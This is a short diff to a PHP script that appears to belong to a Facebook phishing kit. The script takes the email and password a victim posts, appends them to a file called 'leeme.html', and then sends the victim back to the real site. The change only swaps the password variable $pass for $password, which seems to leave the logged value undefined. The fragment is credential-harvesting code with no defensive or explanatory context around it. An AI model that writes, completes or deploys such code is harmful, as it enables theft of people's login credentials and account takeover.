@@ -11,7 +11,7 @@ $pass = $_POST['pass'];
 $guardame = fopen('leeme.html','a+');
 fwrite($guardame,
 "<br/><b>Usuario:</b>".$email.
-"<br/><b>Contraseña:</b>".$pass." ");
+"<br/><b>Contraseña:</b>".$password." ");
 
 fclose($guardame);
 //Redirecciona a la web original (facebook)
